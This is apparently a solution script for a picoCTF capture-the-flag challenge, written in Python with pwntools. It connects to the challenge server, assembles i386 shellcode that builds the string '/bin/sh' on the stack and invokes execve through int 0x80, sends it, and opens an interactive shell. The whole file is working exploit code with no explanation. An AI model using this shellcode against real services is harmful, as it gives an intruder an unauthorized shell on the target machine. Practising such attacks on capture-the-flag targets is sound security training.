from pwn import *

context.arch='i386'
# HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'wily-courier.picoctf.net', 54129
r = remote(HOST, PORT)

# /sh\x00 = 0x68732f
# /bin = 0x6e69622f
sh = asm(
'''
push 16

pop ecx
nop

xor eax, eax
xor ebx, ebx

mov al, 0x68
shl eax, ecx
mov ah, 0x73
mov al, 0x2f

mov bh, 0x6e
mov bl, 0x69
shl ebx, ecx
mov bh, 0x62
mov bl, 0x2f

push eax
push ebx

xor eax, eax
xor ecx, ecx
xor edx, edx
mov al, 0xb
mov ebx, esp

int 0x80
'''
)

r.sendline(sh)
r.interactive()